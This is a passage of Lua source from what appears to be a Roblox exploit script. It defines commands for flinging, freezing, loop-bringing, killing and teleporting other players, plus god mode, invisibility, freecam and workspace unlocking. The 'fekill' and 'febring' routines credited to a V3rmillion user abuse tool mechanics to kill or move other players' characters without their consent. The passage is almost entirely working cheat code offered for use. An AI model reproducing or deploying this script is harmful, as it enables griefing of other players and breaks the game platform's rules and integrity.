bambam.Force = Vector3.new(POWER,0,POWER)
bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
wait()
local Still = Instance.new("BodyGyro", Torso)
Still.P = 9e4
Still.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
Still.CFrame = Torso.CFrame
local BodyVelocity = Instance.new("BodyVelocity", Torso)
BodyVelocity.Velocity = Vector3.new(0,0.1,0)
BodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)

game:GetService('RunService').Stepped:connect(function()
if Active == true then
Torso.CFrame = game.Players:FindFirstChild(v.Name).Character.HumanoidRootPart.CFrame
end
end)
wait(TimeDelay)
Active = false
for i,v in pairs(Torso:GetChildren()) do
if v:IsA("BodyThrust") then
v:Destroy()
wait()
else
if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
wait()
v:Destroy()
end
end
end
Torso.CFrame = SavedPos
wait()
Torso.CFrame = SavedPos
end
end)
end)

addcmd('line', {},
function(args,speaker)
local toolamount = 40 -- How long the tornado is
local tornadosize = 1 -- The size of how big the opening of the tornado is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = false
        tool.Grip = CFrame.new(Vector3.new(0, math.sin(index * 0.5), index)) * CFrame.Angles(math.rad(tornadosize), 0, -index)
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)

addcmd('waves', {},
function(args,speaker)
local toolamount = 40 -- How long the tornado is
local tornadosize = 1 -- The size of how big the opening of the tornado is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = false
        tool.Grip = CFrame.new(Vector3.new(0, math.sin(index + 0.5), index)) * CFrame.Angles(math.rad(tornadosize), 0, -index)
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)

addcmd('humanmine', {},
function(args,speaker)
local a1 = Instance.new("BodyThrust")
a1.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
a1.Force = Vector3.new(8000,0,8000)
a1.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
wait(.1)
game.Players.LocalPlayer.Character.Torso.Anchored = true
end)

addcmd('bigbowl',{'bbowl'},
function()
local toolamount = 250 -- How much covered the bowl is
local bowlsize = 20 -- How big the bowl is



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer
end
end
LocalPlayer.Character:ClearAllChildren()
local char = Instance.new("Model", workspace)
table.insert(characters, char)
Instance.new("Humanoid", char)
LocalPlayer.Character = char
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer.Backpack
tool.Handle.Massless = true
tool.Grip = CFrame.new(Vector3.new(math.sin(index * 0.1), bowlsize, 0)) * CFrame.Angles(math.sin(index * 0.1), index, 0)
tool.Parent = LocalPlayer.Character
if tool.Handle:FindFirstChild("Mesh") ~= nil then
tool.Handle.Mesh:Destroy()
end
end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = bowlsize
end)

addcmd('tinyball',{'tball'},
function()
local toolamount = 10 -- How much covered the ball is
local ballsize = 6 -- How big the ball is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = true
        tool.Grip = CFrame.new(Vector3.new(0, ballsize, 0)) * CFrame.Angles(math.deg(index), index, 0)
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = ballsize
end)

addcmd('unview',{'unspectate'},
function()
	workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
	notify('Spectate','View turned off')
end)

local fa = false
local cam = workspace.CurrentCamera
local cam1 = 0
local cam2 = 0
local cam3 = 0
local k1 = false
local k2 = false
local k3 = false
local k4 = false
local k5 = false
local k6 = false
cs = 0.5
function movecam()
	local fc = Players.LocalPlayer.Character:FindFirstChild('xFC')
	if fa == false then
		repeat
			if Players.LocalPlayer.Character:FindFirstChild('xFC') then
				local fp = fc.Position
				fc.CFrame = CFrame.new(Vector3.new(fp.X,fp.Y+cam3,fp.Z),cam.CFrame.p)*CFrame.new(cam2,0,cam1)
				fa = true
				Players.LocalPlayer.Character.Head.Anchored = true
			end
			game:GetService('RunService').RenderStepped:Wait()
		until not Players.LocalPlayer.Character:FindFirstChild('xFC')
		fa = false
	end
end
function kp1(inputObject, gameProcessedEvent)
	if not gameProcessedEvent and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild('xFC') then
		if inputObject.KeyCode == Enum.KeyCode.W or inputObject.KeyCode == Enum.KeyCode.Up then
			k1 = true
			cam1 = cs end
		if inputObject.KeyCode == Enum.KeyCode.S or inputObject.KeyCode == Enum.KeyCode.Down then
			k2 = true
			cam1 = (cs*-1) end
		if inputObject.KeyCode == Enum.KeyCode.A or inputObject.KeyCode == Enum.KeyCode.Left then
			k3 = true
			cam2 = cs end
		if inputObject.KeyCode == Enum.KeyCode.D or inputObject.KeyCode == Enum.KeyCode.Right then
			k4 = true
			cam2 = (cs*-1) end
		if inputObject.KeyCode == Enum.KeyCode.E or inputObject.KeyCode == Enum.KeyCode.Space then
			k5 = true
			cam3 = cs end
		if inputObject.KeyCode == Enum.KeyCode.Q or inputObject.KeyCode == Enum.KeyCode.LeftControl then
			k6 = true
			cam3 = (cs*-1) end
	end
end
UserInputService.InputBegan:connect(kp1)
function kp2(inputObject, gameProcessedEvent)
	if not gameProcessedEvent and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild('xFC') then
		if inputObject.KeyCode == Enum.KeyCode.W or inputObject.KeyCode == Enum.KeyCode.Up then
			k1 = false
			if k2 == false then
				cam1 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.S or inputObject.KeyCode == Enum.KeyCode.Down then
			k2 = false
			if k1 == false then
				cam1 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.A or inputObject.KeyCode == Enum.KeyCode.Left then
			k3= false
			if k4== false then
				cam2 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.D or inputObject.KeyCode == Enum.KeyCode.Right then
			k4 = false
			if k3 == false then
				cam2 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.E or inputObject.KeyCode == Enum.KeyCode.Space then
			k5 = false
			if k6 == false then
				cam3 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.Q or inputObject.KeyCode == Enum.KeyCode.LeftControl then
			k6 = false
			if k5 == false then
				cam3 = 0
			end
		end
	end
end
UserInputService.InputEnded:connect(kp2)
fcEnabled = false
function FC()
	if not Players.LocalPlayer.Character:FindFirstChild('xFC') then
		local fc = Instance.new('Part',Players.LocalPlayer.Character)
		fc.CanCollide = false
		fc.Anchored = true
		fc.Transparency = 1
		fc.Size = Vector3.new(1,1,1)
		fc.Name = 'xFC'
		fc.CFrame = Players.LocalPlayer.Character.Head.CFrame
		local cam = workspace.CurrentCamera
		cam.CameraSubject = fc
		cam.CameraType = 'Custom'
		movecam()
	end
end
function UFC()
	if Players.LocalPlayer.Character:FindFirstChild('xFC') then
		Players.LocalPlayer.Character:FindFirstChild('xFC'):Destroy()
		local cam = workspace.CurrentCamera
		cam.CameraSubject = Players.LocalPlayer.Character.Humanoid
		cam.CameraType = 'Custom'
		Players.LocalPlayer.Character.Head.Anchored = false
	end
end
addcmd('printuap',{},
function(args, speaker)
for i, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Part") and v.Anchored == false then
        print(v:GetFullName())
    end
end
end)

addcmd('freecam',{'fc'},
function(args, speaker)
	FC()
end)

addcmd('fixcam',{},
function(args, speaker)
	UFC()
	workspace.CurrentCamera:remove()
	wait(.1)
	workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character.Humanoid
	workspace.CurrentCamera.CameraType = "Custom"
	Players.LocalPlayer.CameraMinZoomDistance = 0.5
	Players.LocalPlayer.CameraMaxZoomDistance = 400
	Players.LocalPlayer.CameraMode = "Classic"
	Players.LocalPlayer.Character.Head.Anchored = false
end)

addcmd('unfreecam',{'nofreecam','unfc','nofc'},
function(args, speaker)
	UFC()
end)

addcmd('freecamspeed',{'fcspeed'},
function(args, speaker)
	if isNumber(args[1]) then
		cs = args[1]
	end
end)

addcmd('firstp',{},
function(args, speaker)
	Players.LocalPlayer.CameraMode = "LockFirstPerson"
end)

addcmd('thirdp',{},
function(args, speaker)
	Players.LocalPlayer.CameraMode = "Classic"
end)

addcmd('maxzoom',{},
function(args, speaker)
	Players.LocalPlayer.CameraMaxZoomDistance = args[1]
end)

addcmd('unlockws',{'unlockworkspace'},
function(args, speaker)
	notify('Workspace Modified','Workspace unlocked')
	wait(1)
    local function unlock(instance) 
        for i,v in pairs(instance:GetChildren()) do
            if v:IsA("BasePart") then
                v.Locked = false
            end
            unlock(v)
        end
    end
    unlock(workspace)
end)

addcmd('collideparts',{'cp'},
function(args, speaker)
local LocalPlayer = game:GetService("Players").LocalPlayer
local unanchoredparts = {}
local movers = {}
for index, part in pairs(workspace:GetDescendants()) do
    if part:IsA("Part") and part.Anchored == false and part:IsDescendantOf(LocalPlayer.Character) == false then
        table.insert(unanchoredparts, part)
        part.Massless = true
        part.CanCollide = true
        if part:FindFirstChildOfClass("BodyAngularVelocity") ~= nil then
            part:FindFirstChildOfClass("BodyAngularVelocity"):Destroy()
        end
    end
end
for index, part in pairs(unanchoredparts) do
    local mover = Instance.new("BodyAngularVelocity", part)
    local mover2 = Instance.new("BodyPosition", part)
    table.insert(movers, mover2)
    mover.MaxTorque = Vector3.new(0,200,0)
    mover.AngularVelocity = Vector3.new(0,500,0)
end
repeat
    for index, mover in pairs(movers) do
        mover.Position = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame:PointToWorldSpace(Vector3.new(0, 0, 0))
    end
    wait(0.5)
until LocalPlayer.Character:FindFirstChild("Humanoid").Health <= 0
for _, mover in pairs(movers) do
    mover:Destroy()
end
end)


addcmd('lockws',{'lockworkspace'},
function(args, speaker)
	notify('Workspace Modified','Workspace locked')
	wait(1)
    local function lock(instance) 
        for i,v in pairs(instance:GetChildren()) do
            if v:IsA("BasePart") then
                v.Locked = true
            end
            lock(v)
        end
    end
    lock(workspace)
end)


addcmd('age',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		local players = getPlayer(args[1], speaker)
		local ages = {}
		for i,v in pairs(players) do
			local p = Players[v]
			table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
		end
    notify('Account Age',table.concat(ages, ',\n'))
	end
end)


addcmd('goto',{'to'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			if speaker.Character:FindFirstChild("HumanoidRootPart") then
				speaker.Character.Humanoid.Jump = true
			end
			speaker.Character.HumanoidRootPart.CFrame = Players[v].Character.HumanoidRootPart.CFrame + Vector3.new(4,1,0)
		end
	end
end)

bringT = {}
addcmd('loopbring',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			if Players[v].Name ~= Players.LocalPlayer.Name and not FindInTable(bringT, Players[v].Name) then
				table.insert(bringT, Players[v].Name)
				local pchar=Players[v].Character
				pchar.Humanoid.Jump = true
				repeat wait()
				pchar = Players[v].Character
				for i,c in pairs(players) do
					if pchar~= nil and pchar:FindFirstChild("HumanoidRootPart") and speaker.Character ~= nil and speaker.Character:FindFirstChild("HumanoidRootPart") then
						pchar.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame + Vector3.new(3,1,0)
					end
				end
				until not FindInTable(bringT, Players[v].Name)
			end
		end)
	end
end)

addcmd('unloopbring',{'noloopbring'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			for a,b in pairs(bringT) do if b == Players[v].Name then table.remove(bringT, a) end end
		end)
	end
end)

addcmd('freeze',{'fr'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i, v in pairs(players) do
			spawn(function()
				for i, x in next, Players[v].Character:GetDescendants() do
					if x:IsA("Part") and not x.Anchored then
						x.Anchored = true
					end
				end
			end)
		end
	end
end)

addcmd('thaw',{'unfreeze','unfr'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i, v in pairs(players) do
			spawn(function()
				for i, x in next, Players[v].Character:GetDescendants() do
					if x:IsA("Part") and x.Anchored then
						x.Anchored = false
					end
				end
			end)
		end
	end
end)

addcmd('kill',{'fekill'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if tools(Players.LocalPlayer) then
		for i,v in pairs(players)do
			-- Full credit to CyclicaIIy @V3rmillion
			local LocalPlayer = Players.LocalPlayer
			local ran1 = false
			local ran2 = false
			local equipped = false
			local savepos = LocalPlayer.Character.HumanoidRootPart.CFrame
			local target = Players[v]
			if #LocalPlayer.Backpack:GetChildren() < 2 then
				repeat
					for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
						if tool:IsA("Tool") then
							tool.Parent = LocalPlayer
						end
					end
					LocalPlayer.Character:ClearAllChildren()
					local char = Instance.new("Model", workspace)
					char.Name = "character"
					Instance.new("Part", char).Name = "Torso";
					Instance.new("Part", char).Name = "Head";
					Instance.new("Humanoid", char).Name = "Humanoid";
					LocalPlayer.Character = char
					repeat wait() until LocalPlayer.Character
				until #LocalPlayer:GetChildren() - 4 >= 2
				for _, char in pairs(workspace:GetChildren()) do
					if char.Name == "character" and char:IsA("Model") then
						char:Destroy()
					end
				end
				repeat wait() until LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
				for _, tool in pairs(LocalPlayer:GetChildren()) do
					if tool:IsA("Tool") then
						tool.Parent = LocalPlayer.Backpack
					end
				end
			end
			LocalPlayer.Character.HumanoidRootPart.CFrame = savepos
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Character
			local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
			tool.Parent = workspace
			local attacher = LocalPlayer.Character:FindFirstChildOfClass("Tool")
			attacher.Parent = workspace
			LocalPlayer.Character.Humanoid:EquipTool(tool)
			repeat wait() until LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= nil
			LocalPlayer.Character.Humanoid:UnequipTools()
			attacher.AncestryChanged:connect(function()
				if ran1 == false then
					ran1 = true
					equipped = true
				end
			end)
			local anim = Instance.new("Animation")
			anim.AnimationId = "rbxassetid://188632011"
			local loadanim = LocalPlayer.Character.Humanoid:LoadAnimation(anim)
			loadanim.Looped = true
			loadanim:Play()
			LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(math.random(-1000, 1000), math.random(0, 1000), math.random(-1000, 1000)))
			local stabilize = Instance.new("Part", workspace)
			stabilize.Size = Vector3.new(50, 1, 50)
			stabilize.Anchored = true
			stabilize.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame * Vector3.new(0, -3.5, 0))
			repeat
				target.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 2 + LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector * 2)
				wait()
			until equipped == true
			stabilize:Destroy()
			loadanim:Stop()
			anim:Destroy()
			LocalPlayer.CharacterAdded:connect(function(character)
				if ran2 == false then
					ran2 = true
					character:WaitForChild("HumanoidRootPart")
					character.HumanoidRootPart.CFrame = savepos
				end
			end)
			tool.GripPos = Vector3.new(0, -math.huge, 0)
			LocalPlayer.Character.Humanoid:EquipTool(tool)
			repeat
				LocalPlayer.Character.Humanoid.Jump = true
				wait()
			until ran2 == true
		end
	else
		notify('Tool Required','You need to have a tool to use this command')
	end
end)

addcmd('bring',{'febring'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if tools(Players.LocalPlayer) then
		for i,v in pairs(players)do
			-- Full credit to CyclicaIIy @V3rmillion
			local LocalPlayer = Players.LocalPlayer
			local ran1 = false
			local equipped = false
			local savepos = LocalPlayer.Character.HumanoidRootPart.CFrame
			local target = Players[v]
			if #LocalPlayer.Backpack:GetChildren() < 2 then
				repeat
					for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
						if tool:IsA("Tool") then
							tool.Parent = LocalPlayer
						end
					end
					LocalPlayer.Character:ClearAllChildren()
					local char = Instance.new("Model", workspace)
					char.Name = "character"
					Instance.new("Part", char).Name = "Torso";
					Instance.new("Part", char).Name = "Head";
					Instance.new("Humanoid", char).Name = "Humanoid";
					LocalPlayer.Character = char
					repeat wait() until LocalPlayer.Character
				until #LocalPlayer:GetChildren() - 4 >= 2
				for _, char in pairs(workspace:GetChildren()) do
					if char.Name == "character" and char:IsA("Model") then
						char:Destroy()
					end
				end
				repeat wait() until LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
				for _, tool in pairs(LocalPlayer:GetChildren()) do
				if tool:IsA("Tool") then
						tool.Parent = LocalPlayer.Backpack
					end
				end
				LocalPlayer.Character.HumanoidRootPart.CFrame = savepos
			end
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Character
			local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
			tool.Parent = workspace
			local attacher = LocalPlayer.Character:FindFirstChildOfClass("Tool")
			attacher.Parent = workspace
			LocalPlayer.Character.Humanoid:EquipTool(tool)
			repeat wait() until LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= nil
			LocalPlayer.Character.Humanoid:UnequipTools()
			attacher.AncestryChanged:connect(function()
				if ran1 == false then
					ran1 = true
					equipped = true
				end
			end)
			local anim = Instance.new("Animation")
			anim.AnimationId = "rbxassetid://188632011"
			local loadanim = LocalPlayer.Character.Humanoid:LoadAnimation(anim)
			loadanim.Looped = true
			loadanim:Play()
			repeat
				target.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 2 + LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector * 2)
				wait()
			until equipped == true
			loadanim:Stop()
			anim:Destroy()
			LocalPlayer.Character.Humanoid:EquipTool(tool)
			wait()
			LocalPlayer.Character.Humanoid:UnequipTools()
		end
	else
		notify('Tool Required','You need to have a tool to use this command')
	end
end)

oofing = false
addcmd('loopoof',{},
function(args, speaker)
	oofing = true
	repeat wait(0.01)
		for i,v in pairs(Players:GetPlayers()) do
			if v.Character ~= nil and v.Character:FindFirstChild'Head' then
				for _,x in pairs(v.Character.Head:GetChildren()) do
					if x:IsA'Sound' then x.Playing = true end
				end
			end
		end
	until oofing == false
end)

addcmd('unloopoof',{},
function(args, speaker)
	oofing = false
end)

addcmd('respawn',{'ungod'},
function(args, speaker)
	respawn(Players.LocalPlayer)
end)

addcmd('refresh',{'re'},
function(args, speaker)
	refresh(Players.LocalPlayer)
end)

addcmd('god',{''},
function(args, speaker)
	Players.LocalPlayer.Character.Humanoid.Name = 1
	local l = Players.LocalPlayer.Character["1"]:Clone()
	l.Parent = Players.LocalPlayer.Character
	l.Name = "Humanoid"
	wait(0.1)
	Players.LocalPlayer.Character["1"]:Destroy()
	workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
	Players.LocalPlayer.Character.Animate.Disabled = true
	wait(0.1)
	Players.LocalPlayer.Character.Animate.Disabled = false
	Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
end)

addcmd('invisible',{'invis'},
function(args, speaker)
-- Full credit to Elite1337#9377 & Timeless#4044 @Discord
local function CheckRig()
	if Players.LocalPlayer.Character then
		local Humanoid = Players.LocalPlayer.Character:WaitForChild('Humanoid')
		if Humanoid.RigType == Enum.HumanoidRigType.R15 then
			return 'R15'
		else
			return 'R6'
		end
	end
end
local function InitiateInvis()
	local Character = Players.LocalPlayer.Character
	local StoredCF = Character.PrimaryPart.CFrame
	local Part = Instance.new('Part',workspace)
	Part.Size = Vector3.new(5,0,5)
	Part.Anchored = true
	Part.CFrame = CFrame.new(Vector3.new(9999,9999,9999))
	Character.PrimaryPart.CFrame = Part.CFrame*CFrame.new(0,3,0)
	spawn(function()
		wait(3)
		Part:Destroy()
	end)
	if CheckRig() == 'R6' then
		local Clone = Character.HumanoidRootPart:Clone()
		Character.HumanoidRootPart:Destroy()
		Clone.Parent = Character
	else
	local Clone = Character.LowerTorso.Root:Clone()
	Character.LowerTorso.Root:Destroy()
	Clone.Parent = Character.LowerTorso
	end
end
InitiateInvis()
end)

addcmd('strengthen',{},
function(args, speaker)
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
		end
	end
end)

addcmd('weaken',{},
function(args, speaker)
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
		end
	end
end)

addcmd('unweaken',{'unstrengthen'},
function(args, speaker)
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
end)

addcmd('jpower',{'jumppower','jp'},
function(args, speaker)
	if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
		Players.LocalPlayer.Character.Humanoid.JumpPower=tonumber(args[1])
	end
end)

addcmd('gravity',{'grav'},
function(args, speaker)
	workspace.Gravity = (args[1])
end)

addcmd('cake',{},
function(args, speaker)
local dankamount = 60 
local coolness = 1 



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer
end
end
LocalPlayer.Character:ClearAllChildren()
local char = Instance.new("Model", workspace)
table.insert(characters, char)
Instance.new("Humanoid", char)
LocalPlayer.Character = char
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= dankamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer.Backpack
tool.Handle.Massless = true
for i = .3, 1 do
tool.Grip = CFrame.new(Vector3.new(math.sin(index * i), -coolness, i)) * CFrame.Angles(math.sin(index * i), index, i) * CFrame.new(Vector3.new(0, 0, 0))
tool.Parent = LocalPlayer.Character
end
if tool.Handle:FindFirstChild("Mesh") ~= nil then
tool.Handle.Mesh:Destroy()
end
end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = coolness
end)

addcmd('swirl',{},
function(args, speaker)
local dankamount = 100 
local coolness = 6 



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer
end
end
LocalPlayer.Character:ClearAllChildren()
local char = Instance.new("Model", workspace)
